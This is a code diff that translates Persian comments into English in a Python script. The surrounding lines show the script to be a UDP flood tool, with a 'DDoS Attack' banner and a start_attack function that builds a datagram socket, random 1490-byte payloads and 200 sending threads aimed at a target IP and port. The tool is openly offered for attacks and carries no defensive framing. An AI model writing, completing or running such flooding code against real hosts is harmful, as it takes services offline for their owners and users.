@@ -5,14 +5,14 @@ import random
 import threading
 from datetime import datetime
 
-# رنگ‌ها
+# Colors
 GREEN = '\033[92m'
 CYAN = '\033[96m'
 RED = '\033[91m'
 YELLOW = '\033[93m'
 RESET = '\033[0m'
 
-# طراحی متنی
+# Banner design
 def print_banner():
     os.system("clear")
     os.system("figlet -f slant 'DDoS Attack'")
@@ -53,7 +53,7 @@ def send_packets(ip, port, sock, bytes):
 def start_attack(ip, port):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     bytes = random._urandom(1490)
-    thread_count = 200  # تعداد تردهایی که برای ارسال بسته‌ها استفاده می‌شود
+    thread_count = 200  # Number of threads for packet sending
     threads = []
 
     print(f"{CYAN}Initializing attack...{RESET}")
